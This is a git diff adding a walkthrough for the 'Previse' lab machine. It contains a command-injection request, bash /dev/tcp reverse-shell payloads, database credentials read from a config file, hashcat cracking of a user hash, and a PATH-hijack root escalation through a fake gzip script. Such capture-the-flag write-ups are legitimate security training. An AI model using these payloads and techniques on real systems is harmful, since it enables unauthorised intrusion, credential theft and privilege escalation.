@@ -126,9 +126,190 @@ There are several interesting pages:
 
 ### Account Registration
 Adding Burp's Match and Replace rule:
-```
-Response header | 302 Found | 200 OK
-```
 
 ![image](./screenshot/01.png)
 
+Created user & login:
+```
+bigb0ss : password
+```
+
+![image](./screenshot/02.png)
+
+### Command Injection (www-data)
+Request
+```
+POST /logs.php HTTP/1.1
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Origin: http://10.10.11.104
+Connection: close
+Referer: http://10.10.11.104/file_logs.php
+Cookie: PHPSESSID=aev6d7kta8hb0v50gqq9lcfr1u
+Upgrade-Insecure-Requests: 1
+
+delim=bigb0ss;ping -c 1 10.10.14.17 #
+```
+
+ICMP ping request POC:
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo tcpdump -i tun0 icmp
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+22:15:43.782651 IP 10.10.11.104 > 10.10.14.17: ICMP echo request, id 2721, seq 1, length 64
+22:15:43.782685 IP 10.10.14.17 > 10.10.11.104: ICMP echo reply, id 2721, seq 1, length 64
+```
+
+Reverse Shell:
+```
+POST /logs.php HTTP/1.1
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Origin: http://10.10.11.104
+Connection: close
+Referer: http://10.10.11.104/file_logs.php
+Cookie: PHPSESSID=aev6d7kta8hb0v50gqq9lcfr1u
+Upgrade-Insecure-Requests: 1
+
+delim=bigb0ss;bash -c 'bash -i >%26 /dev/tcp/10.10.14.17/9001 0>%261' #
+```
+
+```
+┌──(kali㉿kali)-[~/htb/box/previse]
+└─$ nc -lvnp 9001                           
+listening on [any] 9001 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.104] 60552
+bash: cannot set terminal process group (1517): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@previse:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## Privesc 
+### MySQL DB Access (www-data --> m4lwhere)
+Getting credentials for the MySQL DB:
+```
+www-data@previse:/var/www/html$ cat config.php
+cat config.php
+<?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+?>
+```
+
+```
+mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)'
+
+...snip...
+
+Database changed
+mysql> show tables; 
++-------------------+
+| Tables_in_previse |
++-------------------+
+| accounts          |
+| files             |
++-------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | bigb0ss  | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2022-01-17 02:52:20 |
++----+----------+------------------------------------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+Cracking the password for the `m4lwhere` user:
+```
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt
+
+...snip...
+
+$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
+```
+
+### user.txt
+```
+m4lwhere@previse:~$ whoami
+m4lwhere
+m4lwhere@previse:~$ cat user.txt 
+822c__REDACTED__7ba71
+```
+
+### Path Injection (m4lwhere --> root)
+```
+m4lwhere@previse:~$ sudo -l
+[sudo] password for m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+m4lwhere@previse:~$ 
+m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
+```
+
+The `access_backup.sh` is calling `gzip` without the full path. We can create a reverse shell filename called as `gzip` in another location and update the `$PATH` to call our `gzip` file first. 
+```
+m4lwhere@previse:/dev/shm$ ls -la
+total 4
+drwxrwxrwt  2 root     root       60 Jan 17 03:54 .
+drwxr-xr-x 19 root     root     3880 Jan 16 23:40 ..
+-rw-rw-r--  1 m4lwhere m4lwhere   42 Jan 17 03:54 gzip
+m4lwhere@previse:/dev/shm$ cat gzip
+bash -i >& /dev/tcp/10.10.14.17/9002 0>&1
+m4lwhere@previse:/dev/shm$ export PATH=/dev/shm:$PATH
+m4lwhere@previse:/dev/shm$ echo $PATH                
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+Making the newly created `gzip` as execuatable:
+```
+m4lwhere@previse:/dev/shm$ chmod +x gzip
+m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh
+```
+
+### root.txt
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9002
+listening on [any] 9002 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.104] 36132
+root@previse:/dev/shm# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@previse:/dev/shm# cat /root/root.txt
+cat /root/root.txt
+24f7__REDACTED__7b04
+```
